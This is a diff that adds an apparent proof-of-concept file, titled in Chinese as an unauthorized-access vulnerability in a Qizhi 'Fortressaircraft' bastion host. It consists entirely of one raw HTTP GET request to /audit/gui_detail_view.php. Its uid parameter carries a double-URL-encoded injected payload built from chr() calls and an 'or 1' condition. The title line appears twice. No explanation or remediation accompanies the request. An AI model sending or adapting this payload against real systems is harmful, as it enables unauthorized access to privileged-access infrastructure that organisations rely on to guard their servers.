@@ -1,0 +1,9 @@
+# Qizhi Fortressaircraft 未授权访问漏洞
+# Qizhi Fortressaircraft 未授权访问漏洞
+GET /audit/gui_detail_view.php?acid=80001582&token=1&id=%255C&uid=%252Cchr%2897%29%29%2520or%25201:%2520print%2520chr%28121%29%252bchr%28101%29%252bchr%28115%29%250d%250a%2523&login=shterm&bid=hd_tag_m8mv26ft HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26ft
+RM-PRO-Token: 7ac564b322fb26ac16b902306de9357d
+RM-PRO-Time: 1742808621401
+User-Agent: curl/7.83.1
+
